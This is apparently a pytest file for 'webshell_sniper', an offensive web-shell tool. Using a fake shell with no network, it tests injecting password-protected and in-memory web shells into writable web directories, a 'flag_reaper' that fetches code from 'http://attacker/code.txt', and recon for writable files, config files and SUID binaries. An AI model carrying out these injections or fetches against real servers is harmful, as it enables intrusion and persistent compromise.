"""Feature logic exercised with a fake WebShell (no network)."""

from types import SimpleNamespace

import requests

from webshell_sniper.features import inject, recon
from webshell_sniper.features.files import _local_path


class FakeWS:
    def __init__(self, run_php_ret: str = "OK", run_cmd_ret: str = ""):
        self.url = "http://t/c.php"
        self.webroot = "/var/www/html"
        self._rp = run_php_ret
        self._rc = run_cmd_ret
        self.executor = SimpleNamespace(disabled_functions=set())
        self.transport = SimpleNamespace(fetch=self._timeout)

    def run_php(self, code: str) -> str:
        return self._rp

    def run_command(self, command: str) -> str:
        return self._rc

    @staticmethod
    def _timeout(url, timeout):
        raise requests.exceptions.ReadTimeout()  # activation "succeeds"


def test_inject_webshell_random_password_per_dir(tmp_path):
    results = inject.inject_webshell(
        FakeWS(), None, ["/var/www/html", "/var/www/html/up"], output_dir=tmp_path
    )
    assert len(results) == 2
    (url1, pw1), (url2, pw2) = results
    assert pw1 != pw2 and len(pw1) == 16  # distinct per directory
    assert url1.startswith("http://t/") and url1.endswith(".php")
    assert (tmp_path / "injected_webshells.txt").exists()


def test_inject_webshell_explicit_password(tmp_path):
    results = inject.inject_webshell(FakeWS(), "hunter2", ["/var/www/html"], output_dir=tmp_path)
    assert results[0][1] == "hunter2"


def test_verify_injected_uses_connect(monkeypatch, tmp_path):
    from webshell_sniper.config import Config
    from webshell_sniper.core.webshell import WebShell

    calls = {}

    def fake_connect(self):
        calls["url"] = self.url
        calls["pw"] = self.password
        self.reason = None
        return True

    monkeypatch.setattr(WebShell, "connect", fake_connect)

    ws = FakeWS()
    ws.transport.config = Config(output_dir=tmp_path)
    assert inject.verify_injected(ws, "http://t/.x.php", "pw123") is True
    assert calls == {"url": "http://t/.x.php", "pw": "pw123"}


def test_inject_memory_webshell_records(tmp_path):
    inject.inject_memory_webshell(FakeWS(), "mpw", ["/var/www/html"], output_dir=tmp_path)
    record = (tmp_path / "injected_webshells.txt").read_text()
    assert "mpw" in record and "memory" in record


def test_flag_reaper_activates(tmp_path):
    activated = inject.flag_reaper(FakeWS(), "http://attacker/code.txt", ["/var/www/html"])
    assert activated == 1


def test_recon_find_writable_dirs_filters_errors():
    ws = FakeWS(run_cmd_ret="/var/www/html\n/var/www/html/up\nfind: '/root': Permission denied\n")
    assert recon.find_writable_dirs(ws) == ["/var/www/html", "/var/www/html/up"]


def test_recon_find_writable_php():
    ws = FakeWS(run_cmd_ret="/var/www/a.php\nfind: bad\n/var/www/b.php\n")
    assert recon.find_writable_php(ws) == ["/var/www/a.php", "/var/www/b.php"]


def test_recon_find_config_files_dedupes_per_keyword():
    ws = FakeWS(run_cmd_ret="/var/www/config.php\n")
    found = recon.find_config_files(ws, ["config"])
    assert found == ["/var/www/config.php"]


def test_recon_find_suid_binaries_aggregates():
    ws = FakeWS(run_cmd_ret="-rwsr-xr-x 1 root root /usr/bin/passwd\n")
    found = recon.find_suid_binaries(ws)
    assert any("passwd" in f for f in found)


def test_recon_get_disabled_functions():
    class WS(FakeWS):
        def __init__(self):
            super().__init__()
            self.executor = SimpleNamespace(disabled_functions={"system", "exec"})

    assert recon.get_disabled_functions(WS()) == {"system", "exec"}


def test_download_path_traversal_is_flattened(tmp_path):
    base = (tmp_path / "t").resolve()
    sneaky = _local_path(FakeWS(), "/../../../../etc/passwd", tmp_path)
    assert sneaky.is_relative_to(base)  # cannot escape the output dir
    assert sneaky.name == "passwd"


def test_download_normal_path_mirrors(tmp_path):
    p = _local_path(FakeWS(), "/var/www/x.php", tmp_path)
    assert p == (tmp_path / "t" / "var" / "www" / "x.php").resolve()
